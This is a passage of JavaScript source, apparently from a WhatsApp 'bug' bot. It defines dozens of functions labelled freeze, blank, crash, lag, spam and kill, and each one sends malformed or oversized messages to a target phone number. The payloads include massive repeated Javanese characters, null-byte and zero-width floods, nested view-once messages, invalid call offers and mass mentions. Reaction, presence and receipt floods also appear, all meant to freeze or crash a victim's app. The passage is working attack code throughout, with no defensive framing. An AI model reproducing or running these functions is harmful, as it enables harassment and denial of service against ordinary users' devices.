      options: Array.from({ length: 300 }, (_, j) => ({
        optionName: 'ꦾ'.repeat(5000) + j
      })),
      selectableOptionsCount: 99999
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── FREEZE 6: List Message Overflow ───────────────────────────
async function bug_freeze6(sock, target) {
  const msg = genWAMessage(target, {
    listMessage: {
      title: 'ꦾ'.repeat(50000),
      description: 'ꦾ'.repeat(50000),
      buttonText: 'ꦾ'.repeat(20000),
      listType: 1,
      sections: Array.from({ length: 500 }, (_, i) => ({
        title: 'ꦾ'.repeat(5000) + i,
        rows: Array.from({ length: 100 }, (_, j) => ({
          title: 'ꦾ'.repeat(3000),
          description: 'ꦾ'.repeat(3000),
          rowId: 'f6_' + i + '_' + j
        }))
      }))
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── FREEZE 7: Template Message ────────────────────────────────
async function bug_freeze7(sock, target) {
  const msg = genWAMessage(target, {
    templateMessage: {
      hydratedTemplate: {
        hydratedContentText: 'ꦾ'.repeat(50000),
        hydratedFooterText: 'ꦾ'.repeat(50000),
        hydratedButtons: Array.from({ length: 2000 }, (_, i) => ({
          index: i,
          quickReplyButton: {
            displayText: 'ꦾ'.repeat(5000),
            id: 'f7_' + i
          }
        }))
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── FREEZE 8: Highly Structured Message ───────────────────────
async function bug_freeze8(sock, target) {
  const msg = genWAMessage(target, {
    highlyStructuredMessage: {
      namespace: 'ꦾ'.repeat(5000),
      elementName: 'ꦾ'.repeat(5000),
      params: Array.from({ length: 5000 }, () => 'ꦾ'.repeat(3000)),
      fallbackLg: 'ꦾ'.repeat(50000),
      fallbackLc: 'ꦾ'.repeat(50000)
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── FREEZE 9: Interactive NativeFlow ──────────────────────────
async function bug_freeze9(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(40000) },
      nativeFlowMessage: {
        buttons: [{
          name: 'galaxy_message',
          buttonParamsJson: JSON.stringify({
            flow_token: '\u0000'.repeat(500000),
            flow_id: 'ꦾ'.repeat(100000),
            flow_cta: 'ꦾ'.repeat(100000),
            screen_0_TextInput_0: '\u0000'.repeat(500000)
          })
        }],
        messageParamsJson: '\u0000'.repeat(1000000)
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── FREEZE 10: Combined Attack ────────────────────────────────
async function bug_freeze10(sock, target) {
  await bug_freeze1(sock, target);
  await sleep(500);
  await bug_freeze2(sock, target);
  await sleep(500);
  await bug_freeze5(sock, target);
}

// ─── BLANK 1: Null Text ────────────────────────────────────────
async function bug_blank1(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: '\u0000'.repeat(300000),
        matchedText: '\u0000',
        description: '\u0000'.repeat(300000),
        title: '\u0000'.repeat(300000),
        previewType: 'NONE'
      }
    }, {}).catch(() => {});
    await sleep(150);
  }
}

// ─── BLANK 2: Zero-Width Text ──────────────────────────────────
async function bug_blank2(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      conversation: '\u200B'.repeat(500000)
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── BLANK 3: BOM Flood ────────────────────────────────────────
async function bug_blank3(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      conversation: '\uFEFF'.repeat(400000)
    }, {}).catch(() => {});
    await sleep(150);
  }
}

// ─── BLANK 4: Control Char ─────────────────────────────────────
async function bug_blank4(sock, target) {
  const chars = '\u0001\u0002\u0003\u0004\u0005\u0006\u0007\u0008\u000B\u000C\u000E\u000F';
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      conversation: chars.repeat(50000)
    }, {}).catch(() => {});
    await sleep(150);
  }
}

// ─── BLANK 5: Empty Render ─────────────────────────────────────
async function bug_blank5(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: '\u0000'.repeat(500000) },
      nativeFlowMessage: {
        buttons: [{ name: 'quick_reply', buttonParamsJson: '\u0000'.repeat(100000) }]
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── BLANK 6: Doc Null ─────────────────────────────────────────
async function bug_blank6(sock, target) {
  await sock.relayMessage(target, {
    documentMessage: {
      url: 'https://mmg.whatsapp.net/null.enc',
      mimetype: 'application/pdf',
      fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
      fileLength: '99999999999999',
      pageCount: 9999999,
      mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
      fileName: '\u0000'.repeat(80000),
      fileEncSha256: 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
      directPath: '/null.enc'
    }
  }, {}).catch(() => {});
}

// ─── BLANK 7: Image Null ───────────────────────────────────────
async function bug_blank7(sock, target) {
  await sock.relayMessage(target, {
    imageMessage: {
      url: 'https://mmg.whatsapp.net/null.enc',
      mimetype: 'image/jpeg',
      fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
      fileLength: '9999999999',
      height: 0,
      width: 0,
      mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
      caption: '\u0000'.repeat(200000),
      fileEncSha256: 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
      directPath: '/null.enc'
    }
  }, {}).catch(() => {});
}

// ─── BLANK 8: Video Null ───────────────────────────────────────
async function bug_blank8(sock, target) {
  await sock.relayMessage(target, {
    videoMessage: {
      url: 'https://mmg.whatsapp.net/null.enc',
      mimetype: 'video/mp4',
      fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
      fileLength: '9999999999999',
      seconds: 0,
      height: 0,
      width: 0,
      mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
      caption: '\u0000'.repeat(200000),
      fileEncSha256: 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
      directPath: '/null.enc'
    }
  }, {}).catch(() => {});
}

// ─── BLANK 9: Audio Null ───────────────────────────────────────
async function bug_blank9(sock, target) {
  await sock.relayMessage(target, {
    audioMessage: {
      url: 'https://mmg.whatsapp.net/null.enc',
      mimetype: 'audio/ogg; codecs=opus',
      fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
      fileLength: '9999999999',
      seconds: 0,
      ptt: true,
      mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
      fileEncSha256: 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
      directPath: '/null.enc'
    }
  }, {}).catch(() => {});
}

// ─── BLANK 10: Combined ────────────────────────────────────────
async function bug_blank10(sock, target) {
  await bug_blank1(sock, target);
  await sleep(300);
  await bug_blank5(sock, target);
  await sleep(300);
  await bug_blank6(sock, target);
}

// ─── CRASH 1: Protocol Stack ───────────────────────────────────
async function bug_crash1(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(target, {
      protocolMessage: {
        type: 0,
        key: {
          remoteJid: target,
          fromMe: true,
          id: '3EB0' + '\u0000'.repeat(800)
        }
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── CRASH 2: Nested ViewOnce ──────────────────────────────────
async function bug_crash2(sock, target) {
  const msg = genWAMessage(target, {
    viewOnceMessage: {
      message: {
        viewOnceMessage: {
          message: {
            viewOnceMessage: {
              message: {
                viewOnceMessage: {
                  message: {
                    viewOnceMessage: {
                      message: {
                        extendedTextMessage: { text: '\u0000'.repeat(500000) }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CRASH 3: Album Infinity ───────────────────────────────────
async function bug_crash3(sock, target) {
  const msg = genWAMessage(target, {
    albumMessage: {
      expectedImageCount: 99999999,
      expectedVideoCount: 99999999
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CRASH 4: Sticker Pack ─────────────────────────────────────
async function bug_crash4(sock, target) {
  await sock.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: 'crash_' + Date.now(),
      name: 'ꦾ'.repeat(65000),
      publisher: 'ꦾ'.repeat(65000),
      stickers: [],
      fileLength: '999999999',
      fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
      fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
      mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
      directPath: '/crash.enc',
      mediaKeyTimestamp: Date.now().toString()
    }
  }, {});
}

// ─── CRASH 5: Extended + Context Bomb ──────────────────────────
async function bug_crash5(sock, target) {
  const msg = genWAMessage(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(80000),
      contextInfo: {
        mentionedJid: Array.from({ length: 30000 }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
        ),
        forwardingScore: 999999,
        isForwarded: true,
        quotedMessage: {
          conversation: '\u0000'.repeat(500000)
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CRASH 6: Group Status V2 ──────────────────────────────────
async function bug_crash6(sock, target) {
  const msg = genWAMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: 'ꦾ'.repeat(80000),
          contextInfo: {
            mentionedJid: Array.from({ length: 5000 }, () =>
              Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
            )
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CRASH 7: Reaction Invalid ─────────────────────────────────
async function bug_crash7(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      reactionMessage: {
        key: {
          remoteJid: target,
          fromMe: false,
          id: '3EB0' + crypto.randomBytes(8).toString('hex')
        },
        text: 'ꦾ'.repeat(8000)
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── CRASH 8: Receipt Corrupt ──────────────────────────────────
async function bug_crash8(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      receiptMessage: {
        type: 'sender',
        timestamp: 99999999999999,
        key: {
          remoteJid: target,
          fromMe: false,
          id: '3EB0' + '\u0000'.repeat(150)
        }
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── CRASH 9: Live Location Null ───────────────────────────────
async function bug_crash9(sock, target) {
  await sock.relayMessage(target, {
    liveLocationMessage: {
      degreesLatitude: 999999,
      degreesLongitude: 999999,
      caption: 'ꦾ'.repeat(100000),
      sequenceNumber: '0',
      jpegThumbnail: '',
      contextInfo: {
        mentionedJid: Array.from({ length: 5000 }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
        )
      }
    }
  }, {});
}

// ─── CRASH 10: Combined ────────────────────────────────────────
async function bug_crash10(sock, target) {
  await bug_crash1(sock, target);
  await sleep(300);
  await bug_crash5(sock, target);
  await sleep(300);
  await bug_crash9(sock, target);
}

// ─── LAG 1: Massive Mention ────────────────────────────────────
async function bug_lag1(sock, target) {
  const msg = genWAMessage(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(50000),
      contextInfo: {
        mentionedJid: Array.from({ length: 50000 }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
        )
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── LAG 2: Repeat Conversation ────────────────────────────────
async function bug_lag2(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.relayMessage(target, {
      conversation: 'ꦾ'.repeat(60000)
    }, {}).catch(() => {});
    await sleep(80);
  }
}

// ─── LAG 3: ExtendedText Repeat ────────────────────────────────
async function bug_lag3(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(50000),
        description: 'ꦾ'.repeat(50000),
        title: 'ꦾ'.repeat(50000)
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── LAG 4: Mention + Quote ────────────────────────────────────
async function bug_lag4(sock, target) {
  const msg = genWAMessage(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(30000),
      contextInfo: {
        mentionedJid: Array.from({ length: 30000 }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net'
        ),
        quotedMessage: {
          conversation: 'ꦾ'.repeat(50000)
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── LAG 5: Newsletter Flood ───────────────────────────────────
async function bug_lag5(sock, target) {
  for (let i = 0; i < 15; i++) {
    const msg = genWAMessage(target, {
      extendedTextMessage: {
        text: 'ꦾ'.repeat(30000),
        contextInfo: {
          forwardedNewsletterMessageInfo: {
            newsletterName: 'ꦾ'.repeat(50000),
            newsletterJid: '1@newsletter',
            serverMessageId: i
          },
          forwardingScore: 999999,
          isForwarded: true
        }
      }
    }, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await sleep(200);
  }
}

// ─── LAG 6: Repeated Protocol ──────────────────────────────────
async function bug_lag6(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.relayMessage(target, {
      protocolMessage: {
        type: 0,
        key: { remoteJid: target, fromMe: true, id: '3EB0' + i }
      }
    }, {}).catch(() => {});
    await sleep(50);
  }
}

// ─── LAG 7: Sender Key Distribution ────────────────────────────
async function bug_lag7(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      senderKeyDistributionMessage: {
        groupId: target,
        axolotlSenderKeyDistributionMessage: crypto.randomBytes(2000)
      }
    }, {}).catch(() => {});
    await sleep(80);
  }
}

// ─── LAG 8: Device Sent Message ────────────────────────────────
async function bug_lag8(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      deviceSentMessage: {
        destinationJid: target,
        message: {
          conversation: 'ꦾ'.repeat(30000)
        }
      }
    }, {}).catch(() => {});
    await sleep(80);
  }
}

// ─── LAG 9: Ephemeral Message ──────────────────────────────────
async function bug_lag9(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          extendedTextMessage: { text: 'ꦾ'.repeat(50000) }
        }
      }
    }, {}).catch(() => {});
    await sleep(80);
  }
}

// ─── LAG 10: Combined ──────────────────────────────────────────
async function bug_lag10(sock, target) {
  await bug_lag1(sock, target);
  await sleep(500);
  await bug_lag2(sock, target);
}

// ─── SPAM 1: Reaction Flood ────────────────────────────────────
async function bug_spam1(sock, target) {
  for (let i = 0; i < 100; i++) {
    await sock.relayMessage(target, {
      reactionMessage: {
        key: {
          remoteJid: target,
          fromMe: false,
          id: '3EB0' + crypto.randomBytes(8).toString('hex')
        },
        text: '😂'
      }
    }, {}).catch(() => {});
    await sleep(80);
  }
}

// ─── SPAM 2: Button Reply ──────────────────────────────────────
async function bug_spam2(sock, target) {
  for (let i = 0; i < 50; i++) {
    const msg = genWAMessage(target, {
      buttonsResponseMessage: {
        selectedButtonId: 'spam_' + i,
        selectedDisplayText: 'ꦾ'.repeat(5000),
        type: 1
      }
    }, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await sleep(100);
  }
}

// ─── SPAM 3: List Reply ────────────────────────────────────────
async function bug_spam3(sock, target) {
  for (let i = 0; i < 50; i++) {
    const msg = genWAMessage(target, {
      listResponseMessage: {
        title: 'ꦾ'.repeat(5000),
        listType: 1,
        singleSelectReply: {
          selectedRowId: 'spam_' + i
        }
      }
    }, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await sleep(100);
  }
}

// ─── SPAM 4: Template Reply ────────────────────────────────────
async function bug_spam4(sock, target) {
  for (let i = 0; i < 50; i++) {
    const msg = genWAMessage(target, {
      templateButtonReplyMessage: {
        selectedId: 'spam_' + i,
        selectedDisplayText: 'ꦾ'.repeat(5000)
      }
    }, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    await sleep(100);
  }
}

// ─── SPAM 5: Location Stream ───────────────────────────────────
async function bug_spam5(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: -6.2 + Math.random(),
        degreesLongitude: 106.8 + Math.random(),
        name: 'ꦾ'.repeat(10000)
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── SPAM 6: VCard Stream ──────────────────────────────────────
async function bug_spam6(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      contactMessage: {
        displayName: 'ꦾ'.repeat(10000),
        vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + 'ꦾ'.repeat(10000) + '\nEND:VCARD'
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── SPAM 7: Sticker Stream ────────────────────────────────────
async function bug_spam7(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/spam.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp',
        height: 512,
        width: 512,
        directPath: '/spam.enc',
        fileLength: 999999
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── SPAM 8: PTV Stream ────────────────────────────────────────
async function bug_spam8(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      ptvMessage: {
        url: 'https://mmg.whatsapp.net/spam.enc',
        mimetype: 'video/mp4',
        fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
        fileLength: '9999999999',
        seconds: 1,
        mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
        fileEncSha256: 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
        directPath: '/spam.enc'
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── SPAM 9: Document Stream ───────────────────────────────────
async function bug_spam9(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      documentMessage: {
        url: 'https://mmg.whatsapp.net/spam.enc',
        mimetype: 'application/pdf',
        fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
        fileLength: '9999999999',
        pageCount: 100,
        mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
        fileName: 'spam_' + i + '.pdf',
        fileEncSha256: 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
        directPath: '/spam.enc'
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── SPAM 10: Combined ─────────────────────────────────────────
async function bug_spam10(sock, target) {
  await bug_spam1(sock, target);
  await sleep(500);
  await bug_spam5(sock, target);
}

// ─── KILL 1: Call Offer Invalid ────────────────────────────────
async function bug_kill1(sock, target) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '0' } },
        { tag: 'net', attrs: { medium: '0' } },
        { tag: 'capability', attrs: { ver: '99' }, content: Buffer.from([0xFF, 0xFF, 0xFF, 0xFF]) },
        { tag: 'encopt', attrs: { keygen: '999' } }
      ]
    }]
  }).catch(() => {});
}

// ─── KILL 2: Call + Offer Bomb ─────────────────────────────────
async function bug_kill2(sock, target) {
  for (let i = 0; i < 5; i++) {
    const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
    await sock.query({
      tag: 'call',
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: 'offer',
        attrs: { 'call-id': callId, 'call-creator': sock.user.id },
        content: [
          { tag: 'audio', attrs: { enc: 'opus', rate: '0' } },
          { tag: 'video', attrs: { enc: 'vp8', dec: 'vp8', orientation: '0', screen_width: '0', screen_height: '0' } },
          { tag: 'net', attrs: { medium: '0' } }
        ]
      }]
    }).catch(() => {});
    await sleep(800);
  }
}

// ─── KILL 3: Device Identity Invalid ───────────────────────────
async function bug_kill3(sock, target) {
  await sock.relayMessage(target, {
    senderKeyDistributionMessage: {
      groupId: target,
      axolotlSenderKeyDistributionMessage: Buffer.alloc(5000, 0xFF)
    }
  }, {}).catch(() => {});
}

// ─── KILL 4: Message Context Invalid ───────────────────────────
async function bug_kill4(sock, target) {
  const msg = genWAMessage(target, {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 99999,
      messageSecret: Buffer.alloc(32, 0xFF)
    },
    extendedTextMessage: { text: 'ꦾ'.repeat(50000) }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── KILL 5: Bio Spam ──────────────────────────────────────────
async function bug_kill5(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.relayMessage(target, {
      protocolMessage: {
        type: 0,
        key: { remoteJid: target, fromMe: true, id: '3EB0' + '\u0000'.repeat(500) }
      }
    }, {}).catch(() => {});
    await sleep(100);
  }
}

// ─── KILL 6: Presence Flood ────────────────────────────────────
async function bug_kill6(sock, target) {
  for (let i = 0; i < 30; i++) {
    await sock.sendPresenceUpdate('composing', target).catch(() => {});
    await sleep(50);
    await sock.sendPresenceUpdate('paused', target).catch(() => {});
    await sleep(50);
  }
}

// ─── KILL 7: Group Participant Fail ────────────────────────────
async function bug_kill7(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.groupParticipantsUpdate(target,
      ['628' + Math.floor(Math.random() * 999999999) + '@s.whatsapp.net'],
      'add'
    ).catch(() => {});
    await sleep(100);
  }
}

// ─── KILL 8: Chat Modify ───────────────────────────────────────
async function bug_kill8(sock, target) {
  for (let i = 0; i < 20; i++) {
    await sock.chatModify({
      clear: true,
      lastMessages: [{
        key: { remoteJid: target, fromMe: true, id: '3EB0' + i },
        messageTimestamp: Math.floor(Date.now() / 1000)
      }]
    }, target).catch(() => {});
    await sleep(100);
  }
}

// ─── KILL 9: Read Receipt Blast ────────────────────────────────
async function bug_kill9(sock, target) {
  for (let i = 0; i < 50; i++) {
    await sock.readMessages([{
      remoteJid: target,
      id: '3EB0' + crypto.randomBytes(8).toString('hex'),
      participant: target
    }]).catch(() => {});
    await sleep(50);
  }
}

// ─── KILL 10: Combined ─────────────────────────────────────────
async function bug_kill10(sock, target) {
  await bug_kill1(sock, target);
  await sleep(500);
  await bug_kill6(sock, target);
}

// ─── CAROUSEL 1: Massive Cards ─────────────────────────────────
async function bug_carousel1(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: 200 }, () => ({
          header: { hasMediaAttachment: false, title: '\u2060'.repeat(5000) },
          body: { text: 'ꦾ'.repeat(10000) },
          nativeFlowMessage: {
            buttons: [{
              name: 'quick_reply',
              buttonParamsJson: '\u0000'.repeat(50000)
            }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CAROUSEL 2: ViewOnce Carousel ─────────────────────────────
async function bug_carousel2(sock, target) {
  const msg = genWAMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: 'ꦾ'.repeat(30000) },
          carouselMessage: {
            cards: Array.from({ length: 100 }, () => ({
              header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(5000) },
              body: { text: 'ꦾ'.repeat(5000) }
            })),
            messageVersion: 1
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CAROUSEL 3: Media Carousel ────────────────────────────────
async function bug_carousel3(sock, target) {
  const img = {
    url: 'https://mmg.whatsapp.net/car.enc',
    mimetype: 'image/jpeg',
    fileSha256: Buffer.from('i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=', 'base64'),
    fileLength: '62265', height: 1080, width: 1080,
    mediaKey: Buffer.from('qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=', 'base64'),
    fileEncSha256: Buffer.from('Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=', 'base64'),
    directPath: '/car.enc',
    mediaKeyTimestamp: '1756530813'
  };
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: 100 }, () => ({
          header: { hasMediaAttachment: true, imageMessage: img, title: 'ꦾ'.repeat(3000) },
          body: { text: 'ꦾ'.repeat(5000) }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CAROUSEL 4: Nested Carousel ───────────────────────────────
async function bug_carousel4(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: 50 }, () => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(5000) },
          body: { text: 'ꦾ'.repeat(5000) },
          nativeFlowMessage: {
            buttons: [{
              name: 'galaxy_message',
              buttonParamsJson: JSON.stringify({
                flow_token: '\u0000'.repeat(50000),
                flow_id: 'ꦾ'.repeat(30000)
              })
            }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CAROUSEL 5: Payment Cards ─────────────────────────────────
async function bug_carousel5(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: 80 }, () => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(5000) },
          nativeFlowMessage: {
            buttons: [{
              name: 'payment_info',
              buttonParamsJson: JSON.stringify({
                reference_id: 'c5',
                amount: 999999999,
                currency: 'IDR'
              })
            }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CAROUSEL 6: URL Cards ─────────────────────────────────────
async function bug_carousel6(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: 100 }, (_, i) => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(3000) },
          nativeFlowMessage: {
            buttons: [{
              name: 'cta_url',
              buttonParamsJson: JSON.stringify({
                display_text: 'ꦾ'.repeat(3000),
                url: 'https://x.com/' + 'ꦾ'.repeat(3000) + i
              })
            }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CAROUSEL 7: Copy Cards ────────────────────────────────────
async function bug_carousel7(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: 100 }, () => ({
          nativeFlowMessage: {
            buttons: [{
              name: 'cta_copy',
              buttonParamsJson: JSON.stringify({
                copy_code: 'ꦾ'.repeat(50000),
                expiry: 9999999999999
              })
            }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CAROUSEL 8: Single Select Cards ───────────────────────────
async function bug_carousel8(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: 100 }, () => ({
          nativeFlowMessage: {
            buttons: [{
              name: 'single_select',
              buttonParamsJson: JSON.stringify({
                title: 'ꦾ'.repeat(50000),
                sections: Array.from({ length: 100 }, (_, j) => ({
                  title: 'ꦾ'.repeat(3000) + j,
                  rows: Array.from({ length: 50 }, (_, k) => ({
                    title: 'ꦾ'.repeat(2000),
                    id: 'c8_' + j + '_' + k
                  }))
                }))
              })
            }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

// ─── CAROUSEL 9: Mixed Cards ───────────────────────────────────
async function bug_carousel9(sock, target) {
  const msg = genWAMessage(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: 120 }, (_, i) => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(3000) },
          body: { text: 'ꦾ'.repeat(5000) },
          nativeFlowMessage: {
            buttons: [
              { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(2000), id: 'c9_' + i }) },
